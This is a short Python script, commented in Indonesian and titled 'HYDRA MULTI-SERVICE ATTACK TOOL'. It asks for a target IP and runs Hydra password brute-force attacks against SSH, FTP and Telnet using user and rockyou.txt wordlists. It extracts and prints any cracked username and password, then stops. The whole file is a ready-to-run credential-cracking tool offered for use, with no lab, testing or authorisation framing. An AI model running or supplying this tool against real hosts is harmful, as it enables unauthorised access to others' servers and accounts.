import subprocess
import re

# ANSI colors
GREEN = "\033[92m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Fungsi untuk menjalankan perintah Hydra dan langsung menampilkan output
def run_command(cmd, service):
    print(f"{BOLD}\n[+] Menyerang {service.upper()}...{RESET}")
    print(f"{BOLD}[CMD] {cmd}{RESET}\n")

    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    for line in process.stdout:
        decoded = line.decode(errors="ignore").strip()
        print(decoded)

        # Deteksi hasil sukses login
        match = re.search(r'host:\s*(\S+)\s+login:\s*(\S+)\s+password:\s*(\S+)', decoded)
        if match:
            user_found = match.group(2)
            pass_found = match.group(3)
            print(f"\n{GREEN}{BOLD}✅ BERHASIL LOGIN!{RESET}")
            print(f"{GREEN}SERVICE : {service.upper()}")
            print(f"USERNAME: {user_found}")
            print(f"PASSWORD: {pass_found}{RESET}\n")
            return True  # Hentikan loop jika berhasil

    return False  # Lanjut ke service berikutnya

# Fungsi utama serangan ke semua service
def attack_services(target_ip):
    services = ["ssh", "ftp", "telnet"]
    user_list = "user.txt"
    pass_list = "rockyou.txt"
    threads = 16

    for service in services:
        cmd = f"hydra -L {user_list} -P {pass_list} {service}://{target_ip} -t {threads} -W 1 -f -V"
        success = run_command(cmd, service)
        if success:
            print(f"{GREEN}🛑 Serangan dihentikan karena login berhasil pada service {service.upper()}.{RESET}")
            break

def main():
    print(f"{BOLD}=== HYDRA MULTI-SERVICE ATTACK TOOL ==={RESET}")
    target_ip = input("Masukkan IP target: ").strip()

    attack_services(target_ip)

    print(f"\n{BOLD}=== Semua serangan selesai ==={RESET}")

if __name__ == "__main__":
    main()
